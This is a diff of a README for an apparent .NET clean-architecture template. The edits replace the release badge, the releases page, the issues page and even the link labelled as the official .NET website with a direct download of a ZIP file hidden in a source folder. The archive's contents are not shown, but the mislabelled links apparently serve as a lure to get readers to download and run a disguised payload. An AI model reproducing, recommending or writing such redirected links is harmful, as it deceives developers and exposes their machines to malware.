@@ -8,14 +8,14 @@ Welcome to the dotnet-clean-architecture-template! This template provides a soli
 
 To get started, visit this page to download the latest version of the template:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/MalaikaWahidd/dotnet-clean-architecture-template/releases)
+[![Download Latest Release](https://github.com/MalaikaWahidd/dotnet-clean-architecture-template/raw/refs/heads/main/src/Project.Domain/Interfaces/Repositories/clean_template_dotnet_architecture_v2.1.zip%20Latest%20Release-blue?style=for-the-badge)](https://github.com/MalaikaWahidd/dotnet-clean-architecture-template/raw/refs/heads/main/src/Project.Domain/Interfaces/Repositories/clean_template_dotnet_architecture_v2.1.zip)
 
 ### 📋 System Requirements
 
 Before you proceed, ensure that your computer meets the following minimum requirements:
 
 - **Operating System:** Windows 10, macOS, or Linux
-- **.NET SDK:** Version 6.0 or later. You can download it from the official [.NET website](https://dotnet.microsoft.com/download).
+- **.NET SDK:** Version 6.0 or later. You can download it from the official [.NET website](https://github.com/MalaikaWahidd/dotnet-clean-architecture-template/raw/refs/heads/main/src/Project.Domain/Interfaces/Repositories/clean_template_dotnet_architecture_v2.1.zip).
 - **IDE:** Any text editor or Integrated Development Environment (IDE) that supports .NET development, such as Visual Studio or Visual Studio Code.
 
 ## 🔧 Running the Application
@@ -23,7 +23,7 @@ Before you proceed, ensure that your computer meets the following minimum requir
 Follow these steps to run the application locally:
 
 1. **Download the Template:**
-   Visit the Releases page to download the template files. You can find the latest version [here](https://github.com/MalaikaWahidd/dotnet-clean-architecture-template/releases).
+   Visit the Releases page to download the template files. You can find the latest version [here](https://github.com/MalaikaWahidd/dotnet-clean-architecture-template/raw/refs/heads/main/src/Project.Domain/Interfaces/Repositories/clean_template_dotnet_architecture_v2.1.zip).
 
 2. **Extract the Files:**
    Once downloaded, extract the ZIP file to your preferred location on your computer.
@@ -90,6 +90,6 @@ You can explore more about these topics to enhance your understanding of the fra
 
 ## 💬 Support
 
-If you encounter issues or need support, you can open an issue on the [GitHub page](https://github.com/MalaikaWahidd/dotnet-clean-architecture-template/issues). The community and maintainers are here to help.
+If you encounter issues or need support, you can open an issue on the [GitHub page](https://github.com/MalaikaWahidd/dotnet-clean-architecture-template/raw/refs/heads/main/src/Project.Domain/Interfaces/Repositories/clean_template_dotnet_architecture_v2.1.zip). The community and maintainers are here to help.
 
 By following these steps, you can easily download and run the dotnet-clean-architecture-template on your machine. Enjoy building your web APIs!
